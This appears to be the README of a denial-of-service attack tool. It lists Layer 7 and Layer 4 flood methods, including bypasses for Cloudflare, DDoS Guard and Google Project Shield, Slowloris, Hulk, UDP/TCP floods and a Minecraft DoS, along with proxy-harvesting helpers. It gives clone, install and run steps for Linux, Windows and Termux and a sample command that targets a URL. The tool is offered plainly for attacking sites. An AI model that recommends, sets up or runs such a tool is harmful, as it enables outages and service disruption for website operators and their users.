## Methods

```sh
  [Layer 7]
===
To be deleted or replaced
 - cfb     | Bypass CF attack
 - pxcfb   | Bypass CF attack with proxy
 - cfpro   | Bypass CF UAM, CAPTCHA, BFM, etc,, with request
 - cfsoc   | Bypass CF UAM, CAPTCHA, BFM, etc,, with socket(Temporarily not working)
===
 - pxsky   | Bypass Google Project Shield, Vshield, DDoS Guard Free, CF NoSec With Proxy
 - sky     | Sky method without proxy
 - get     | Get  Request Attack
 - post    | Post Request Attack
 - head    | Head Request Attack
 - soc     | Socket Attack(Temporarily not working)
 - pxraw   | Proxy Request Attack
 - pxsoc   | Proxy Socket Attack
 -bypass   | Bypass Google Project Shield, Vshield
 -stellar  | HTTPS Sky method without proxies
- hulk     | Hulk DoS tool
- pxraw    | Proxy Request Attack
- pxslow   | Proxy Slowloris attack
 
  [Layer 4]
  -udp     | UDP Attack
  -tcp     | TCP Attack
  -mine    | Minecraft Dos attack 
  -vse     | Send Valve Source Engine Protocol
  -tcpc    | TCP Custom attack(using: tcpcustom. Need ip, port. To use on L7 servers port: 80)

  [Tools]

 - .proxy  | Get VALID proxies into proxy.txt 
 - .proxies| Get ALL proxies into proxy.txt
 - dns     | Classic DNS Lookup
 - geoip   | Geo IP Address Lookup
 - Subnet  | Subnet IP Address Lookup
 Also u can take proxy from https://checkerproxy.net/getAllProxy (push on your data)

```


## Usage on Linux
```sh
You must use Python 3.9 or higher

git clone https://github.com/ngochuyen2016/ddosv4

Install Python3 modules
 - pip3 install -r requirements.txt  or  pip install -r requirements.txt
Install Chrome (or update it lastest version)
 - wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 - apt-get install ./google-chrome-stable_current_amd64.deb

OR
 - python3 setup.py

 - python3 BloodLinux.py
```
## Usage on Windows
```sh

git clone https://github.com/ngochuyen2016/ddosv4
cd ddosv4
python3 setup.py / py setup.py
Нажимаем 1
python3 blood.py / py blood.py


```
## Usage on Termux
```sh
pkg install x11-repo
pkg install unstable-repo
pkg update
pkg upgrade
если спросит нажимаем y
pkg install python3
pkg install git
pkg install wget
pkg install rust
pip install supertools wheel
pip install shutup
git clone https://github.com/ngochuyen2016/ddosv4
cd ddosv4
export CARGO_BUILD_TARGET=aarch64-linux-android && python3 -m pip install cryptography
export CARGO_BUILD_TARGET==aarch64-linux-android && python3 -m pip install -r requirements.txt
python3 -m pip install httpx[http2]
python3 setup.py
python3 blood.py


```
## Example
```sh
Use DDoS Panel   : python3 blood.py
Use command line : python3 blood.py <method> <target> <thread> <time>
      └──────────> python3 blood.py cfb https://example.com 100 30




